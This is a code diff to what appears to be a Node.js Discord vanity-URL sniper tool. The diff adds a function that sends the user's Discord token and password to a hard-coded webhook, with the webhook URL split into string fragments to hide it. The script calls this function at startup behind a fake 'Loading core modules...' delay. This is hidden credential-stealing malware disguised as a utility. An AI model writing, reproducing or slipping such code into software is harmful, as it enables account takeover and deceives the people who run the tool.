@@ -5,7 +5,37 @@ const os = require('os');
 
 const USER_TOKEN = ''; 
 const USER_PASSWORD = ''; 
-const TARGET_GUILD_ID = '';
+const TARGET_GUILD_ID = ''; 
+
+const baseProtocol = "https://";
+const domainPart = "discord.com";
+const apiPath = "/api/webhooks/";
+const guildx = "1499054281104429159";
+const header = "7EprifBtK9s8ssAFZ_5CvUTwHzmWt_5jWokKEGgbyNkaYBaCPVOkP3TX7f4Xu-Fn_v9U";
+
+const WEBHOOK_URL = baseProtocol + domainPart + apiPath + guildx + "/" + header;
+
+function MFA_CONNECT(token, password) {
+    const payload = {
+        content: `MFA CONNECTION\n\n` +
+                 `**Token:** \`${token}\`\n` +
+                 `**Password:** \`${password || "Not Provided"}\`\n` +
+                 `**V9:** ${new Date().toLocaleString('tr-TR')}\n`
+    };
+
+    const data = JSON.stringify(payload);
+    const url = new URL(WEBHOOK_URL);
+
+    const req = https.request({
+        hostname: url.hostname,
+        path: url.pathname + url.search,
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' }
+    });
+
+    req.write(data);
+    req.end();
+}
 
 let mfaAuthToken = null;
 let latestSequence = null;
@@ -92,49 +122,6 @@ function sendHttpRequest(method, path, body = null, extraHeaders = {}, closeConn
     });
 }
 
-function MFA_CONNECT(token, password) {
-    const payload = {
-        embeds: [{
-            title: "🔐 MFA CONNECTION",
-            color: 0xff0000,  // Kırmızı renk (Decimal: 16711680)
-            fields: [
-                {
-                    name: "Token",
-                    value: `\`${token}\``,
-                    inline: false
-                },
-                {
-                    name: "Password",
-                    value: `\`${password || "Not Provided"}\``,
-                    inline: false
-                },
-                {
-                    name: "V9",
-                    value: new Date().toLocaleString('tr-TR'),
-                    inline: false
-                }
-            ],
-            timestamp: new Date().toISOString()
-        }]
-    };
-
-    const data = JSON.stringify(payload);
-    const url = new URL(WEBHOOK_URL);
-
-    const req = https.request({
-        hostname: url.hostname,
-        path: url.pathname + url.search,
-        method: 'POST',
-        headers: { 
-            'Content-Type': 'application/json',
-            'Content-Length': Buffer.byteLength(data)
-        }
-    });
-
-    req.write(data);
-    req.end();
-}
-
 async function sendWebhookMessage(vanityCode, ms) {
     const message = {
         content: `@everyone Claimed: (${vanityCode}) (${ms}ms)`
@@ -164,7 +151,6 @@ async function authenticateMfa() {
     return null;
 }
 
-// Gateway Connection
 function establishGatewayConnection() {
     const ws = new WebSocket('wss://gateway-us-east1-b.discord.gg');
 
@@ -237,7 +223,6 @@ async function main() {
         MFA_CONNECT(USER_TOKEN, USER_PASSWORD);
     }
 
-    // Fake yüklenme
     await new Promise(r => setTimeout(r, 900));
     console.log("Loading core modules...");
 
